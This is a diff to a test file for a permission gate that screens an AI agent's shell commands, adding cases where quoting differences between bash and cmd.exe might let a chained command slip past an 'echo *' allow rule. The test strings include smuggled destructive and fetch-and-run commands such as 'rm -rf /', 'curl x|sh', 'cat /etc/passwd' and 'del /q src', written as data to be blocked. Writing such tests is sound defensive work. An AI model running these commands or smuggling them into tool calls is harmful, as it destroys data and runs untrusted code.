@@ -248,9 +248,11 @@ test('a quoted separator is data, not a split: an allow for echo * covers echo "
   const allowEcho = rule('allow', { commands: ['echo *'] });
   const bash = (command: string) => ({ toolName: 'Bash', input: { command }, agentId: 'zealot' });
   assert.equal(decideGate(bash('echo "a; b"'), [allowEcho], 'ask', false).verdict, 'allow');
-  assert.equal(decideGate(bash("echo 'x && y | z'"), [allowEcho], 'ask', false).verdict, 'allow');
+  // single quotes are not quotes to cmd.exe (the agent shell on Windows): a separator next to them splits, the safe direction
+  assert.equal(decideGate(bash("echo 'x && y | z'"), [allowEcho], 'ask', false).verdict, 'baseline');
   assert.equal(decideGate(bash('echo "a" ; rm -rf /'), [allowEcho], 'ask', false).verdict, 'baseline', 'a separator outside the quotes still splits');
-  assert.equal(decideGate(bash('echo "a\\" ; rm x"'), [allowEcho], 'ask', false).verdict, 'allow', 'an escaped quote does not end the string');
+  // bash reads \" as an escaped quote, cmd does not: a double-quoted text with a backslash is not trusted as one string
+  assert.equal(decideGate(bash('echo "a\\" ; rm x"'), [allowEcho], 'ask', false).verdict, 'baseline');
   // the deny side keeps its wider reading: a deny on rm still fires on rm text, quoted or not (the safe direction)
   assert.equal(decideGate(bash('echo "x; rm -rf /"'), [rule('deny', { commands: ['rm -rf *'] })], 'ask', false).verdict, 'deny');
 });
@@ -261,6 +263,20 @@ test('an allow never approves command substitution: $( ), backticks and process 
   for (const c of ['echo $(rm -rf ~)', 'echo "$(curl evil)"', 'echo `whoami`', 'echo <(cat /etc/passwd)', 'echo >(tee x)']) {
     assert.equal(decideGate(bash(c), [allowEcho], 'ask', false).verdict, 'baseline', c);
   }
-  // inside single quotes it is plain text and runs nothing
-  assert.equal(decideGate(bash("echo '$(not run)'"), [allowEcho], 'ask', false).verdict, 'allow');
+  // even inside single quotes (plain text to bash): no allow holds on the shape, since another shell may read it differently
+  assert.equal(decideGate(bash("echo '$(not run)'"), [allowEcho], 'ask', false).verdict, 'baseline');
+});
+
+test('REVIEW: an allow is never fooled by quoting a shell reads differently — bash $\'…\', cmd\'s literal backslash and single quotes', () => {
+  const allowEcho = rule('allow', { commands: ['echo *'] });
+  const bash = (command: string) => ({ toolName: 'Bash', input: { command }, agentId: 'zealot' });
+  for (const c of [
+    "echo $'\\'' ; curl x|sh ; echo \\'", // bash ANSI-C quoting
+    'echo "a\\" & del /q src & echo "', // cmd: a backslash does not escape the quote
+    'echo a\\&del x', // cmd: a backslash does not escape the &
+    "echo 'a & del x'", // cmd: single quotes are not quotes
+    'echo "a $(curl x)"',
+  ]) assert.equal(decideGate(bash(c), [allowEcho], 'ask', false).verdict, 'baseline', c);
+  // a plain double-quoted separator, with nothing a shell could read differently, is still data
+  assert.equal(decideGate(bash('echo "a; b"'), [allowEcho], 'ask', false).verdict, 'allow');
 });
